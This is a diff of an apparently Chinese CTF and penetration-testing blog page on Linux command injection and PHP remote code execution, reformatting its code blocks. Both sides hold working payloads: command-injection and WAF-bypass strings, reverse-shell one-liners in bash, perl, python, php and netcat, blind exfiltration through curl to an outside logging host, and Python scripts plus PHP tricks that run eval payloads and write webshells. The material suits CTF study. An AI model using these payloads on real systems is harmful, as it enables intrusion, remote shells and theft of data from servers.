@@ -469,126 +469,199 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <h1 id="linux-命令-amp-RCE"><a href="#linux-命令-amp-RCE" class="headerlink" title="linux 命令&amp; RCE"></a>linux 命令&amp; RCE</h1><p>rce,即remote command/code execute。通常都是渗透中希望能够利用的漏洞之一。因为我们可以以此进行命令执行，读取我们想要的文件或者反弹shell。</p>
 <h2 id="命令及关键字waf"><a href="#命令及关键字waf" class="headerlink" title="命令及关键字waf"></a>命令及关键字waf</h2><p>简单的命令执行如DVWA靶场里的command injection 模块。它给了我们一个输入框，而它会将输入框的内容当做命令执行。<br>这样一来我们就可以用命令拼接来执行其他命令。<br>1.使用<code>&amp;&amp; &amp; ;</code>直接多语句执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;ls</span><br><span class="line">127.0.0.1&amp;ls</span><br><span class="line">127.0.0.1; ls</span><br></pre></td></tr></table></figure>
+<pre><code class="linux">127.0.0.1&amp;&amp;ls
+127.0.0.1&amp;ls
+127.0.0.1; ls</code></pre>
 <p>2.高级一(亿)点的，使用管道符</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1| ls</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">127.0.0.1| ls</code></pre>
 <p>管道符的妙用不止这么一点了。比如CTF或实战渗透中都可能用到的</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'Y2F0Cg=='</span> | base64 -d</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">echo &#39;Y2F0Cg==&#39; | base64 -d</code></pre>
 <p>只要用管道符可以bypass掉绝大部分关键字的waf。<br>实际利用之读flag.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>  Y2F0IGZsYWcucGhw|base64 -d|bash</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">echo  Y2F0IGZsYWcucGhw|base64 -d|bash</code></pre>
 <p>bash如果没有可以用sh</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>  Y2F0IGZsYWcucGhw|base64 -d|sh</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">echo  Y2F0IGZsYWcucGhw|base64 -d|sh</code></pre>
 <p>同时应对关键字waf，linux的特性还允许我们花式绕过<br>对空格</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$IFS
+${IFS}
+$IFS$1 //$1改成$加其他数字貌似都行
+&lt; 
+&lt;&gt; 
+{cat,flag.php}  //用逗号实现了空格功能
+%20 
+%09 </code></pre>
 <p>对关键字，如flag，cat，包括上面管道符在内也有很多方法。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat fl*  linux中*通配符匹配任意字数</span><br><span class="line"><span class="built_in">echo</span> xxxxxxx| base64 -d </span><br><span class="line">ca\t fla\g</span><br><span class="line">cat fl<span class="string">''</span>ag</span><br><span class="line">a=f;b=lag;cat <span class="variable">$a</span><span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">cat fl*  linux中*通配符匹配任意字数
+echo xxxxxxx| base64 -d 
+ca\t fla\g
+cat fl&#39;&#39;ag
+a=f;b=lag;cat $a$b</code></pre>
 <p>对命令函数cat的waf,寻找替代也是一种方法，毕竟读取文件函数很多。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head  读头几行</span><br><span class="line">tail    读尾几行</span><br><span class="line">tac     按行倒着读</span><br><span class="line">more   </span><br><span class="line">less</span><br><span class="line">nl</span><br><span class="line">sort</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">head  读头几行
+tail    读尾几行
+tac     按行倒着读
+more   
+less
+nl
+sort
+......</code></pre>
 <p>如果要奇淫技巧，可以使用如<code>cat `ls`</code><br>反引号在linux中作为内联执行。将直接输出结果。所以假如我们就在flag的目录下，这是完全可以直接耍的。</p>
 <p>以上都是直接在webshell执行读取文件的基础上的。实际上有时候我们在实际渗透中需要的是反弹shell。包括有的题目也是需要shell来找flag的。<br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>这个网站总结了常见的反弹shell的方式。实际上总结下常见的几种反弹shell<br>1.bash</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</code></pre>
 <p>bash式的用到的非常多。然而还是会出现有的容器因为是docker起的而没有bash指令的问题，这种时候通常用sh替代。但是sh并不能反弹shell。所以这就涉及到其他的几种方法。</p>
 <p>2.perl</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre>
 <p>3.python</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
 <p>选择python是个不错的替代方式，因为大部分linux机子上都装好了python。(比如题目环境是flask起的时候，肯定是有python了)<br>4.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
 <p>php同理。<br>5.netcat</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
 <p>原来看到文章说，所有linux机子都预装好了nc。我觉得是很棒的。不过自己尝试过nc反弹的shell交互性稍微差了一点点。</p>
 <p>如果遇到waf，可以用上面普通命令一样的bypass方法解决。<br>或者我们可以如此，使用<code>curl wget</code>等等直接访问我们vps上的提前写好的反弹shell文件。</p>
 <p>之于更深一步的命令执行暂且不谈。在渗透中自然会用到的。</p>
 <h2 id="bypass长度限制"><a href="#bypass长度限制" class="headerlink" title="bypass长度限制"></a>bypass长度限制</h2><p>HITCON2017的baby-first-revenge的例子可以说是老例子了。它的bypass长度可以达到5个<br>具体trick是以下这些：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -t 可以按时间顺序列出所有文件</span><br><span class="line">linux 可以用\进行命令的换行</span><br><span class="line">换行不影响命令执行</span><br><span class="line">sh _只要四个字符就可以执行命令</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">ls -t 可以按时间顺序列出所有文件
+linux 可以用\进行命令的换行
+换行不影响命令执行
+sh _只要四个字符就可以执行命令</code></pre>
 <p>然而因为这个解决方案太过高级，导致大家都会了后就不会再有人出这方面的题目考察了……</p>
 <h2 id="盲打-RCE-amp-timebased-RCE"><a href="#盲打-RCE-amp-timebased-RCE" class="headerlink" title="盲打 RCE &amp; timebased RCE"></a>盲打 RCE &amp; timebased RCE</h2><p>time-based RCE是一个常常作为拔高水平的命令执行考点。具体常见于一下代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = $_GET[`cmd`];</span><br><span class="line">`$cmd`;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+$cmd = $_GET[`cmd`];
+`$cmd`;</code></pre>
 <p>当我们的命令执行没有回显怎么办？常见办法之一当然是利用curl,或者wget把结果打到vps上。有点xxe盲打的味道。只不过并不需要提前放好文件，只要vps监听即可。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls`</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">curl http://ip.port.b182oj.ceye.io/`ls`</code></pre>
 <p>当然get请求的弊端之一是我们只能打出结果的一行结果，这当然是不行的<br>但是我们可以轻松利用sed命令解决问题。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p`</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 2p`</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 3p`</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p`
+curl http://ip.port.b182oj.ceye.io/`ls | sed -n 2p`
+curl http://ip.port.b182oj.ceye.io/`ls | sed -n 3p`</code></pre>
 <p>将分别打出每一行的信息。<br>进一步还可以打出任意行任意字段内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1`  截取第一个字</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1-3` 截取第1~3个字</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 2-5` 截取第2~5个</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1`  截取第一个字
+curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1-3` 截取第1~3个字
+curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 2-5` 截取第2~5个</code></pre>
 <p>在此基础上也诞生了time-based RCE。原理就如上面一样。因为已经没有回显了，我们在浏览器页面就可以直接构造rce</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [$(whoami|base32|cut –c 1)=O];<span class="keyword">then</span> sleep 10;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">if [$(whoami|base32|cut –c 1)=O];then sleep 10;fi</code></pre>
 <p>类似sql时间盲注的原理。其中<code>[ ]</code>是linux的条件表达式符号。使用base32是因为我们的返回值可能有特殊字符。<br>这样就完全可以依靠盲打脚本来进行命令执行。</p>
 <p>关于linux命令还有些tricks 没有提到，一方面是因为自己了解的毕竟是有限的。另一方面是因为下面的内容中将继续使用到。关于php结合linux命令的一些tricks。</p>
 <h1 id="php-RCE-bypass-amp-花式写shell"><a href="#php-RCE-bypass-amp-花式写shell" class="headerlink" title="php RCE bypass &amp; 花式写shell"></a>php RCE bypass &amp; 花式写shell</h1><p>php中的RCE方式可不少。通常最大的难点是写一个webshell出来。而写出webshell后执行命令也会遇到禁用系统函数的情况。这种时候就有许许多多的高级技巧。不仅仅是php的特性问题了，还有许多高级构造。</p>
 <h2 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h2><p>  之所以把无参RCE放到这一块。就是因为无参RCE的利用主要依靠php函数达成。所以小结下常见trick。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {    
+    eval($_GET[&#39;code&#39;]);
+}</code></pre>
 <p>最早出自于p牛的easyphplimit<a href="https://www.jianshu.com/p/19a37402554f" target="_blank" rel="noopener">https://www.jianshu.com/p/19a37402554f</a>我还在GXYCTF中复现同为无参RCE的题目<a href="https://www.jianshu.com/p/2b5e7bd64264" target="_blank" rel="noopener">https://www.jianshu.com/p/2b5e7bd64264</a><br>其实无参RCE的主要要点就是只能执行如下类型函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()));</span><br><span class="line">a();</span><br></pre></td></tr></table></figure>
+<pre><code class="php">a(b(c()));
+a();</code></pre>
 <p>个人第一习惯首先是使用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'.'</span>))</span><br></pre></td></tr></table></figure>
+<pre><code class="php">print_r(scandir(&#39;.&#39;))</code></pre>
 <p>探测目录。但此处显然<code>.  &#39;&#39;</code>都使用不了。那么怎么构造呢？我们可以轻松使用函数达成</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<pre><code class="php">print_r(scandir(current(localeconv())));</code></pre>
 <p><code>localeconv</code>返回一个数组。其数组头一个值为<code>decimal_point</code>，也就是一个点。 <code>current()</code>起到取出数组第<br>一个变量的作用，所以可以以此替代scandir要用的点。<br>还有一种常规点的做法，只需<code>getcwd()</code>即可返回目录。而<code>dirname()</code>可以往目录上跳。当然，如果想读取的文件在上级目录，就得再加上一个<code>chdir()</code><br>比如code-breakng的payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
-<p>其中用到的array_reverse()也是为了应对flag的数组索引不是特殊索引的情况。调整后使用<code>current, next，end</code>可以解决大部分问题。</p>
+<pre><code>readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><p>其中用到的array_reverse()也是为了应对flag的数组索引不是特殊索引的情况。调整后使用<code>current, next，end</code>可以解决大部分问题。</p>
 <p>当然这类无参RCE还有其他用法，比如：<br>1.<code>getenv()</code>函数<br>这一函数将返回一个环境变量的值，而我们需要的是从这个数组中选取需要的值进行利用。<br>常常是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array_flip(getenv()));</span><br></pre></td></tr></table></figure>
+<pre><code class="php">array_rand(array_flip(getenv()));</code></pre>
 <p>可以随机获取数组中某一个键值。爆破之后能拿到数组中指定值</p>
 <p>2.<code>getallheaders()</code></p>
 <p>从http头中获取值。因此十分便捷。比如当http头最后一个值使我们构造好的<code>byc: phpinfo()</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure>
+<pre><code class="php">var_dump(end(getallheaders()));</code></pre>
 <p>如此即可执行<code>phpinfo()</code><br>但是注意，这是个apache函数，如果遇到nginx将不再适用。<br>3.<code>get_defined_vars()</code><br>正是为了应对getallheaders的缺陷，我们可以选择<code>get_defined_vars()</code>。因为它返回的将是全局变量，全局变量包括<code>$_GET  $_POST</code>都是可以直接使用的。这样我们就多了一个可以执行命令的函数。比如取出了_GET的话。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;byc=system(<span class="string">'ls'</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">?cmd=eval(end(current(get_defined_vars())));&amp;byc=system(&#39;ls&#39;);</code></pre>
 <p>甚至我们也能利用<code>$_FILES</code>，通过伪造文件上传达成调用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('cat /flag');"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">  payload: BytesIO(<span class="string">'2333!'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://localhost/shell.php?cmd=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+from io import BytesIO
+
+payload = &quot;system(&#39;cat /flag&#39;);&quot;.encode(&#39;hex&#39;)
+files = {
+  payload: BytesIO(&#39;2333!&#39;)
+}
+
+r = requests.post(&#39;http://localhost/shell.php?cmd=eval(hex2bin(array_rand(end(get_defined_vars()))));&#39;, files=files, allow_redirects=False)
+
+print (r.text)</code></pre>
 <p>使用hex2bin是为了防止关键字的过滤或转换。</p>
 <p>4.<code>session_id()</code>函数</p>
 <p>与上面的全局变量同样的道理。只不过我们可以利用php的特性。只要是<code>PHPSESSID</code>后的值，就可以直接赋给<code>session_id</code>。既然如此我们只需解决<code>session_id</code>值为字母加数字的问题了。同样使用<code>hex2bin</code>即可<br>前提条件是要先session_start()</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/shell.php?cmd=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo '23333';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line">	<span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">import requests
+url = &#39;http://localhost/shell.php?cmd=eval(hex2bin(session_id(session_start())));&#39;
+payload = &quot;echo &#39;23333&#39;;&quot;.encode(&#39;hex&#39;)
+cookies = {
+    &#39;PHPSESSID&#39;:payload
+}
+r = requests.get(url=url,cookies=cookies)
+print (r.text)</code></pre>
 <h2 id="花式写shell"><a href="#花式写shell" class="headerlink" title="花式写shell"></a>花式写shell</h2><p>花式写shell算是php一个十分考验技巧的点了。当然之前上面linux部分所写的bypass长度也算花式写shell。但是那主要利用的是linux的特性。我们这里尝试使用php的特性，写几种最常见的webshell</p>
 <p>1.常规拆分</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=`$_GET[<span class="number">1</span>]`;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">cmd=`$_GET[1]`;&amp;1</code></pre>
 <p>基本算是用烂了，也是我这种菜鸡最喜欢用的类型。相当与写一个一句话木马。</p>
-<p>2.include<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="keyword">include</span>$_GET[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><br>很妙，但是可能会受限于远程文件包含。这个选项默认是不开启的。</p>
+<p>2.include</p>
+<pre><code class="php">cmd=include$_GET[1];</code></pre>
+<p>很妙，但是可能会受限于远程文件包含。这个选项默认是不开启的。</p>
 <p>3.include升级版<br>为了解决这一问题，我们可以尝试本地文件包含。为此只要<code>file_put_contents()</code>写入一个文件即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure>
-<p>其中<code>file_put_contents</code>的第一个参数是文件名。PHP会认为N是一个常量，但之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。<br>由于写入符号时函数会报错，可以选择写入payload的base64,分次写入，最后伪协议包含：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="keyword">include</span>$_GET[<span class="number">0</span>];&amp;<span class="number">0</span>=php:<span class="comment">//filter/read=convert.base64-decode/resource=N</span></span><br></pre></td></tr></table></figure>
+<pre><code>$_GET[a](N,a,8);&amp;a=file_put_contents</code></pre><p>其中<code>file_put_contents</code>的第一个参数是文件名。PHP会认为N是一个常量，但之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。<br>由于写入符号时函数会报错，可以选择写入payload的base64,分次写入，最后伪协议包含：</p>
+<pre><code class="php">cmd=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</code></pre>
 <p>4.变长参数+回调后门</p>
 <p>p牛给出的无视waf的神招。利用了php5.6的特性。</p>
 <p>在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将$arr数组展开成多个参数，传入func函数。<br>所以可以</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=usort(...$_GET);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">cmd=usort(...$_GET);</code></pre>
 <p>以下参数get传值。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=phpinfo();&amp;<span class="number">2</span>=assert</span><br></pre></td></tr></table></figure>
+<pre><code class="php">1[]=test&amp;1[]=phpinfo();&amp;2=assert</code></pre>
 <p>p牛解释是：</p>
 <blockquote>
 <p>大概过程就是，GET变量被展开成两个参数[‘test’, ‘phpinfo();’]和assert，传入usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数中的phpinfo();。修改phpinfo();为webshell即可。</p>
 </blockquote>
 <p>这个做法最妙的就是<code>...$_GET</code>绕过waf。</p>
 <h2 id="写畸形shell"><a href="#写畸形shell" class="headerlink" title="写畸形shell"></a>写畸形shell</h2><h3 id="php的某些特性"><a href="#php的某些特性" class="headerlink" title="php的某些特性"></a>php的某些特性</h3><p>应该说要先熟悉一下php中大括号的妙处,可变变量的妙处</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"hello"</span>;</span><br><span class="line">$$a=<span class="string">"world"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;<span class="comment">//hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $hello"</span>;<span class="comment">//hello world</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;_GET&quot;&#125;&#x3D;&#x3D;&#x3D;&#x3D;&gt;$_GET</span><br></pre></td></tr></table></figure>
-<p>同时在<code>${}</code>中，字符串如果不带<code>&#39;&#39; ,&quot; &quot;</code>。并不会影响生成以其为名的变量</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="variable">$a</span>=1111;</span><br><span class="line">php &gt; var_dump(<span class="variable">$&#123;a&#125;</span>);</span><br><span class="line">PHP Warning:  Use of undefined constant a - assumed <span class="string">'a'</span> (this will throw an Error <span class="keyword">in</span> a future version of PHP) <span class="keyword">in</span> php shell code on line 1</span><br></pre></td></tr></table></figure>
+<pre><code class="PHP">&lt;?php
+$a=&quot;hello&quot;;
+$$a=&quot;world&quot;;
+echo &quot;$a ${$a}&quot;;//hello world
+echo &quot;$a $hello&quot;;//hello world</code></pre>
+<pre><code>${&quot;_GET&quot;}====&gt;$_GET</code></pre><p>同时在<code>${}</code>中，字符串如果不带<code>&#39;&#39; ,&quot; &quot;</code>。并不会影响生成以其为名的变量</p>
+<pre><code class="bash">php &gt; $a=1111;
+php &gt; var_dump(${a});
+PHP Warning:  Use of undefined constant a - assumed &#39;a&#39; (this will throw an Error in a future version of PHP) in php shell code on line 1</code></pre>
 <p>假如我们换成字符串，就会发现它在<code>${}</code>中是会被解析的。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'b'</span></span><br><span class="line">$&#123;$a&#125;=&gt;$b</span><br><span class="line">var_dump($&#123;$a&#125;);=&gt;var_dump($b);</span><br><span class="line">$b=<span class="string">'1'</span>=&gt;string(<span class="number">1</span>) <span class="string">"1"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">$a=&#39;b&#39;
+${$a}=&gt;$b
+var_dump(${$a});=&gt;var_dump($b);
+$b=&#39;1&#39;=&gt;string(1) &quot;1&quot;</code></pre>
 <p>因此我们可以明白：<br><code>$$</code>或<code>${}</code>能利用一个字符串创造出一个同名变量。变量名只能包含字母数字字符以及下划线；但是<code>${}</code>可以使得只包含数字，比如<code>${1}</code>。此时<code>${1}</code>就变成了一个变量。</p>
 <h3 id="各种方法"><a href="#各种方法" class="headerlink" title="各种方法"></a>各种方法</h3><ol>
